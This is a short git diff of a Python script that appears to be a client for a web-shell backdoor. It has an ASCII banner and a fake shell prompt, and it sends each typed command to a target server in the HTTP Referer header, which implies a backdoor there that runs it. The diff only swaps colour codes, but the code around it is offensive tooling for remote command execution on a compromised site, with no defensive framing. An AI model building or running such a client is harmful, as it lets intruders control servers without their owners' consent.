@@ -14,7 +14,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
-print(bcolors.WARNING + '''                                 
+print(bcolors.FAIL + '''                                 
                     ,--,,-.----.    
   ,----..         ,--.'|\    /  \   
  /   /   \     ,--,  | :|   :    \  
@@ -35,10 +35,10 @@ print(bcolors.WARNING + '''
 
 def main():
     print("")
-    cmd = input(bcolors.WARNING + "bloostealth@" + domain + bcolors.ENDC + " :" + bcolors.OKBLUE + "~" + bcolors.ENDC + "$ ")
+    cmd = input(bcolors.FAIL + "bloostealth@" + domain + bcolors.ENDC + " :" + bcolors.OKBLUE + "~" + bcolors.ENDC + "$ ")
     if cmd == "su":
         print("")
-        print(bcolors.WARNING + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
+        print(bcolors.FAIL + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
         main()
     else :
         r=requests.get(target, headers={"Referer":cmd})
